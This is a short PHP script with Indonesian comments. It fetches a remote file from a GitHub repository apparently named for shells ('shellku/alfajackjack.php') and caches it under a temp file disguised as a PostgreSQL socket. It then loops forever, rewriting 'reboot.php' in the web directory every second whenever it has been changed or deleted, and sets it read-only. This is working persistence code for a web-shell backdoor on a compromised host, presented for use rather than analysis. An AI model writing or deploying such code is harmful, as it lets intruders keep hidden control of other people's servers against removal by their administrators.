<?php

set_time_limit(0);

$files = [
    [
        'path' => __DIR__ . '/reboot.php',
        'url' => 'https://raw.githubusercontent.com/jackythekingsMan/shellku/refs/heads/main/alfajackjack.php',
        'chmod' => 0444
    ],
];

$tempDir = '/home/qualidad/tmp/';
$stopFile = $tempDir . '/stop';
$notifFile = $tempDir . '/finish';

foreach ($files as $key => $value) {
    $tempFile = $tempDir . "/pgsql_socket_{$key}.sock";

    $files[$key]['tmp_file'] = $tempFile;

    if (!file_exists($tempFile)) {
        $fileContent = file_get_contents($files[$key]['url']);
        if ($fileContent === false) {
            echo "Gagal mengunduh file dari URL: " . $files[$key]['url'] . "\n";
            continue;
        }
        file_put_contents($tempFile, $fileContent);
    }
}

while (true && !file_exists($stopFile)) {
    foreach ($files as $key => $value) {
        $filePath = $files[$key]['path'];
        $tmpFilePath = $files[$key]['tmp_file'];
        $dirPath = dirname($filePath);

        // Buat direktori jika belum ada
        if (!is_dir($dirPath)) {
            mkdir($dirPath, 0755, true);
        }

        // Pastikan file temp ada
        if (!file_exists($tmpFilePath)) {
            echo "File temp tidak ditemukan: $tmpFilePath\n";
            continue;
        }

        // Bandingkan hash file
        if (!file_exists($filePath) || hash_file('md5', $tmpFilePath) != hash_file('md5', $filePath)) {
            $handle = fopen($filePath, 'w');
            if ($handle) {
                fwrite($handle, file_get_contents($tmpFilePath));
                fclose($handle);
                chmod($filePath, $files[$key]['chmod']);
            } else {
                echo "Gagal membuka file: $filePath\n";
            }
        }
    }
    sleep(1);
}

file_put_contents($notifFile, 'finish');
